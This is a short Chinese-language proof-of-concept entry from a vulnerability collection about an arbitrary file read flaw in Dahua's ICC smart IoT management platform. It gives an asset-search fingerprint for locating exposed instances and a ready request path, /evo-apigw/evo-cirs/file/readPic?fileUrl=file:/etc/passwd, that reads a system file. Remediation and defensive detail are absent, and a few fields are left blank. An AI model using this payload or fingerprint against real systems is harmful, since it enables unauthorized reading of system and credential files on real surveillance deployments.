---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 大华智能物联综合管理平台(ICC)存在任意文件读取漏洞

# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台(ICC)存在任意文件读取漏洞。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征


# 四、漏洞复现
```plain
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dh0fr3iwsw1u74kk>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
